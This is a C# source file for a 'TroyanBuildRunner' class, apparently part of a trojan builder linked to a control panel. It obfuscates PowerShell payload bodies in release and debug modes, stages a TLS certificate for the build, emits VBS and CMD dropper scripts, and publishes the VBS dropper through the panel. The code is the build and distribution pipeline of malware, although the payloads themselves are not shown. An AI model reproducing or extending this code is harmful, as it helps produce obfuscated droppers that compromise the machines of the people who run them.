using Commons;

namespace Troyan.Core;

public sealed class TroyanBuildRunner : ITroyanBuildRunner
{
    private readonly IPowerShellObfuscator _obfuscator;
    private readonly ITroyanPlainVbsEmitter _plainVbs;
    private readonly ITroyanPlainCmdEmitter _plainCmd;

    public TroyanBuildRunner(
        IPowerShellObfuscator obfuscator,
        ITroyanPlainVbsEmitter plainVbs,
        ITroyanPlainCmdEmitter plainCmd)
    {
        _obfuscator = obfuscator;
        _plainVbs = plainVbs;
        _plainCmd = plainCmd;
    }

    public void Run(string server, string packId, ServerService panelService)
    {
        var layout = panelService.Layout();
        panelService.StageHelphaestusTlsPfxForTroyanBuild(layout);

        CustomBuilder[] steps =
        {
            new BodyBuilder(TroyanBuildMode.Release, _obfuscator),
            new BodyBuilder(TroyanBuildMode.Debug, _obfuscator),
        };

        foreach (var cb in steps)
        {
            Console.WriteLine(cb);
            var result = cb.Build(server, packId, panelService);
            foreach (var line in result)
                Console.WriteLine(line);
        }

        _plainVbs.Write(layout);
        _plainCmd.Write(layout);
        Console.WriteLine("VBS (_output): " + layout.TroyanOutputVbs);
        Console.WriteLine("CMD (_output): " + layout.TroyanOutputCmd);
        panelService.PublishTroyanVbsFromBuildOutput(layout);
    }
}
